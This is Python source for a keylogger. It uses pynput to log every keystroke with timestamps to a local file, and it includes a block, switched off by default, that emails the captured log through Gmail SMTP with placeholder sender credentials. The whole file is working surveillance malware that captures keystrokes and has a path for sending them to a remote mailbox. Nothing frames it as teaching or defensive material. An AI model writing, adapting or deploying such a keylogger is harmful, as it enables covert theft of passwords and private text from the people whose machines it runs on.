from os.path import getsize
from os.path import exists
from pynput import keyboard
import smtplib
import datetime

if exists("keystroke.log"):
    pass
else:
    f=open("keystroke.log", "a")
    f.close()
    
send=False
if send == True:
    try:
        filesize = getsize("keystroke.log")
        if filesize > 0:
            senderEmail = "sender@gmail.com"
            receverEmail = "recever@gmail.com"
            password = "password-sender"

            f = open("keystroke.log", "r")
            message = f.read()
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(senderEmail, password)
            server.sendmail(senderEmail, receverEmail, message)
            server.quit()
            f.close()
    except:
        pass


f = open("keystroke.log", "a")
d = datetime.datetime.now()
header = f"\n\n{d.day}/{d.month}/{d.year}_{d.hour}:{d.minute}:{d.second} :\n"
f.write(header)
f.close()

def capture(key):
    ch = str(key)

    if "Key." in ch:
            ch = f"[{ch}]"

    if "\\x" in ch:
        ch = ""

    li = ["[\'~\']", "[\'`\']", "[\'¨\']", "[\'^\']"]
    for i in li: 
        if ch == i:
            ch = ch.replace("\'", "")
            ch = ch.replace("[", "")
            ch = ch.replace("]", "")

    if ch == "\'\\\\\'":
        ch = "\\"

    if ch == "\'\"\'":#"
        ch = ch.replace("\'", "")
    if ch == "\"\'\"":#'
        ch = ch.replace("\"", "")
    else:ch = ch.replace("\'", "")

    if ch == "<96>":ch = "0"
    if ch == "<97>": ch = "1"
    if ch == "<98>": ch = "2"
    if ch == "<99>": ch ="3"
    if ch == "<100>": ch = "4"
    if ch == "<101>": ch = "5"
    if ch == "<102>": ch = "6"
    if ch == "<103>": ch = "7"
    if ch == "<104>": ch = "8"
    if ch == "<105>": ch = "9"
    if ch == "<110>": ch = "."

    print(ch)
    f = open("keystroke.log", "a")
    fr = open("keystroke.log", "r")
    if len(fr.readlines()[-1]) >= 100:
        f.write("\n")
    f.write(ch)
    f.close()
    fr.close()



with keyboard.Listener(on_press=capture) as listener:
    listener.join()
    
